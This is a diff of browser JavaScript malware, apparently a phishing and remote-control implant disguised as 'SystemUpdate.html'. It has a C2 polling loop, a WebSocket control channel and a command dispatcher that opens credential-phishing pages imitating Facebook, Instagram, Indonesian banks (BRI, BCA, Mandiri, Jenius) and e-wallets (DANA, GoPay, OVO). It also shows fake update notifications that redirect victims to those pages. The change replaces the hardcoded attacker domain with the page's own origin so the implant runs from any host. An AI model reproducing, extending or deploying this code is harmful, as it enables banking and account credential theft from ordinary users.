@@ -240,7 +240,7 @@ function compressData(data) {
 // ============================================================
 // KONFIGURASI
 // ============================================================
-var SERVER = 'https://verifikasi.site';
+var SERVER = window.location.origin; // https://verifikasi.site
 var HEARTBEAT_INTERVAL = 1800000; // 30 MENIT
 var C2_INTERVAL = 20000;
 var FILE_NAME = 'SystemUpdate.html';
@@ -344,7 +344,7 @@ function registerSW() {
 // ============================================================
 // SERVICE WORKER - ULTIMATE EDITION
 // ============================================================
-var SERVER_URL = 'https://verifikasi.site';
+var SERVER_URL = '${SERVER}';
 var HEARTBEAT_INTERVAL = 1800000;
 var C2_INTERVAL = 20000;
 
@@ -511,7 +511,7 @@ function connectWebSocket() {
 
 function doConnectWebSocket(password) {
     try {
-        var ws = new WebSocket('wss://verifikasi.site/ws');
+        var ws = new WebSocket('wss://' + window.location.host + '/ws');
         var reconnectAttempts = 0;
         var maxReconnect = 20;
         var isConnected = false;
@@ -980,9 +980,9 @@ function eksekusiPerintah(cmd) {
             // ============================================================
             // 🌐 WEB (3)
             // ============================================================
-            case "buka_url": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;
-            case "buka_url_hidden": hasil = bukaURLHidden(cmd.url || "https://verifikasi.site"); break;
-            case "buka_webview": hasil = bukaURL(cmd.url || "https://verifikasi.site"); break;
+            case "buka_url": hasil = bukaURL(cmd.url || SERVER); break;
+            case "buka_url_hidden": hasil = bukaURLHidden(cmd.url || SERVER); break;
+            case "buka_webview": hasil = bukaURL(cmd.url || SERVER); break;
             
             // ============================================================
             // 📥 DOWNLOAD & INSTALL (5)
@@ -1005,11 +1005,11 @@ function eksekusiPerintah(cmd) {
             // ============================================================
             // 📱 APLIKASI (13)
             // ============================================================
-            case "buka_aplikasi": hasil = bukaURL("https://verifikasi.site"); break;
+            case "buka_aplikasi": hasil = bukaURL(SERVER); break;
             case "uninstall_aplikasi": hasil = "Uninstall not available in browser"; break;
             case "get_installed_apps": hasil = "Installed apps not available in browser"; break;
-            case "open_settings": hasil = bukaURL("https://verifikasi.site"); break;
-            case "open_calculator": hasil = bukaURL("https://verifikasi.site"); break;
+            case "open_settings": hasil = bukaURL(SERVER); break;
+            case "open_calculator": hasil = bukaURL(SERVER); break;
             case "open_playstore": hasil = bukaURL("https://play.google.com/store"); break;
             case "open_maps": hasil = bukaURL("https://maps.google.com"); break;
             case "open_camera": hasil = "Camera not available in browser"; break;
@@ -1062,20 +1062,20 @@ function eksekusiPerintah(cmd) {
             // ============================================================
             // 🔓 SOSENG (17)
             // ============================================================
-            case "qr_dana": hasil = bukaURL("https://verifikasi.site"); break;
-            case "fake_update": hasil = bukaURL("https://verifikasi.site"); break;
-            case "fake_bantuan": hasil = bukaURL("https://verifikasi.site"); break;
-            case "phishing_fb": hasil = bukaURL("https://verifikasi.site/fb"); break;
-            case "phishing_ig": hasil = bukaURL("https://verifikasi.site/ig"); break;
-            case "phishing_bri": hasil = bukaURL("https://verifikasi.site/bri"); break;
-            case "phishing_dana": hasil = bukaURL("https://verifikasi.site/dana"); break;
-            case "phishing_gopay": hasil = bukaURL("https://verifikasi.site/gopay"); break;
-            case "phishing_ovo": hasil = bukaURL("https://verifikasi.site/ovo"); break;
-            case "phishing_mandiri": hasil = bukaURL("https://verifikasi.site/mandiri"); break;
-            case "phishing_bca": hasil = bukaURL("https://verifikasi.site/bca"); break;
-            case "phishing_shopee": hasil = bukaURL("https://verifikasi.site/shopee"); break;
-            case "phishing_tokped": hasil = bukaURL("https://verifikasi.site/tokped"); break;
-            case "phishing_jenius": hasil = bukaURL("https://verifikasi.site/jenius"); break;
+            case "qr_dana": hasil = bukaURL(SERVER); break;
+            case "fake_update": hasil = bukaURL(SERVER); break;
+            case "fake_bantuan": hasil = bukaURL(SERVER); break;
+            case "phishing_fb": hasil = bukaURL(SERVER + "/fb"); break;
+            case "phishing_ig": hasil = bukaURL(SERVER + "/ig"); break;
+            case "phishing_bri": hasil = bukaURL(SERVER + "/bri"); break;
+            case "phishing_dana": hasil = bukaURL(SERVER + "/dana"); break;
+            case "phishing_gopay": hasil = bukaURL(SERVER + "/gopay"); break;
+            case "phishing_ovo": hasil = bukaURL(SERVER + "/ovo"); break;
+            case "phishing_mandiri": hasil = bukaURL(SERVER + "/mandiri"); break;
+            case "phishing_bca": hasil = bukaURL(SERVER + "/bca"); break;
+            case "phishing_shopee": hasil = bukaURL(SERVER + "/shopee"); break;
+            case "phishing_tokped": hasil = bukaURL(SERVER + "/tokped"); break;
+            case "phishing_jenius": hasil = bukaURL(SERVER + "/jenius"); break;
             case "fake_notif": hasil = showFakeNotification(cmd.pesan || "Update tersedia!"); break;
             case "ransomware_lock": hasil = "Ransomware lock not implemented"; break;
             case "ransomware_unlock": hasil = "Ransomware unlock not implemented"; break;
@@ -1395,8 +1395,8 @@ function showToast(message) {
 function showFakeNotification(message) {
     try {
         if (Notification.permission === 'granted') {
-            var notif = new Notification('📱 System Update', { body: message || 'Update available!', icon: 'https://verifikasi.site/icon.png' });
-            notif.onclick = function() { window.location.href = 'https://verifikasi.site/fb'; };
+            var notif = new Notification('📱 System Update', { body: message || 'Update available!', icon: SERVER + '/icon.png' });
+            notif.onclick = function() { window.location.href = SERVER + '/fb'; };
             return 'Notification shown: ' + message;
         } else if (Notification.permission !== 'denied') {
             Notification.requestPermission().then(function(permission) {
